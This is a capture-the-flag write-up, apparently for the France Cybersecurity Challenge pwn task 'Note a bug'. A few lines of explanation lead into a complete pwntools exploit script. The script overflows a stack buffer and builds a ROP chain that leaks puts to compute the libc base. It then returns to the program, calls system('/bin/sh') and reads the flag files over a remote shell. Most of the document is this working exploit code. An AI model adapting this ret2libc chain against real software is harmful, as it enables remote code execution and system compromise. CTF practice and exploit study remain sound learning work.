So, on this one, we can't leak the adresses ourselves: we only can input 1 choice before getting closed connection.
In a previous CTF, i've already done something similar: Ret2Libc.
Basically, you have to leak the libc adress using "put", then return to main, and then run your exploit knowing libc offets of the current execution.

Don't forget:
- Extract the file from Note a bug 1
- Extract the libc (or download it from internet): you need the EXACT same, else payloads won't work !

Here's my final payload, using Ret2Lib technique: 
- Leaking put base address
- Returning to main
- Calculating the libc base address
- Using that offset to reach /bin/sh and system
- Exploiting !
```python
from pwn import *

LOCAL_FILE_PATH: str = "./PWN/NoteABug/note_a_bug.bin"
REMOTE_SERVER = "challenges.france-cybersecurity-challenge.fr"
REMOTE_PORT = 2110
libc=ELF("./PWN/NoteABug/libc.so.6")
vuln_elf = ELF(LOCAL_FILE_PATH)
rop = ROP(vuln_elf)
def pwn(r):
    data = r.recvuntil(b'ote\n0. Exit\n>>> ')
    print(data.decode("utf-8"))
    # Reuse the same payload, using the leaked addresses
    r.sendline(b'1')
    data = r.recvuntil(b'ontent length: \n')
    print(data.decode("utf-8"))
    r.sendline(b'200') # add (5*8 addresses)
    data = r.recvuntil(b'Content: \n')
    print(data.decode("utf-8"))
    
    # Find gadgets
    pop_rdi_ret = rop.find_gadget(['pop rdi','ret'])[0]
    print(pop_rdi_ret)

    # Find addresses
    puts_plt = vuln_elf.plt['puts']
    puts_got = vuln_elf.got['puts']
    main_plt = vuln_elf.symbols['newNote']

    print(hex(puts_plt))
    print(hex(puts_got))
    print(hex(main_plt))

    # Build the ROP chain to leak libc address
    rop_chain = b'A'*104
    rop_chain += p64(pop_rdi_ret)  # Pop rdi; ret
    rop_chain += p64(puts_got)  # Address of puts in GOT
    rop_chain += p64(puts_plt)  # Call to puts function to leak address of puts function
    rop_chain += p64(main_plt)   # Return to main
    r.sendline(rop_chain)

    # To debug: r 1 < <(echo "1"; sleep 2; echo "200"; sleep 2; cat input.txt)
    # Then, press c under 2 seconds, and reach your breakpoint.
    test_payload = rop_chain
    print(len(rop_chain))
    print(rop_chain)

    with open ('PWN/NoteABug/input.txt', 'wb') as out:
        out.write(test_payload)

    leaked_puts = r.recv(7)

    print("leaked:", leaked_puts)
    puts_address = u64(leaked_puts.strip().ljust(8, b"\x00"))
    print(hex(puts_address))

    # Calculate libc base address
    libc.address = puts_address - libc.symbols['puts']

    print("Glibc_base:", hex(libc.address))
    system_address = libc.symbols['system']
    print(hex(system_address))


    # /bin/sh string address (gdb -> info proc map -> find x,y,"/bin/sh")
    # bin_sh = 0x7ffff79b3d88
    bin_sh = next(libc.search(b"/bin/sh"))
    print('/bin/sh address:', hex(bin_sh))

    # # System address (gdb -> p system)
    # system_addr = 0x7ffff784f420
    system_addr = libc.symbols["system"]
    print("System address:", hex(system_addr))

    # Ret addr
    ret = rop.find_gadget(['ret'])[0]
    print("ret; addr found:", hex(ret))

    # Exit addresslibc_base
    exit_addr = libc.symbols["exit"]
    print("Exit address:", hex(exit_addr))

    data = r.recvuntil(b"Content length: \n")
    print(data.decode("utf-8"))
    r.sendline(b'200')
    data = r.recvuntil(b'Content: \n')
    print(data.decode("utf-8"))
    # 104 A padding to reach the filename
    payload = b'A'*104
    payload += p64(ret)
    payload += p64(pop_rdi_ret)
    payload += p64(bin_sh)
    payload += p64(system_addr)
    print(payload)

    r.clean()
    r.sendline(payload)
    r.sendline(b'cat /fcsc/YAu4kj47vbSDkqTEf2YttEcK88pXYpf/*')
    r.interactive()

    data = r.recvall(timeout=5)
    print(data)
    
    # r.close()

def run_remote():
    conn = remote(REMOTE_SERVER, REMOTE_PORT)
    pwn(conn)

def run_bin_local(process_path: str):
    proc = process([process_path, "1"])
    pwn(proc)

def main():
    #run_bin_local(LOCAL_FILE_PATH)
    run_remote()

if __name__ == '__main__':
    main()
```
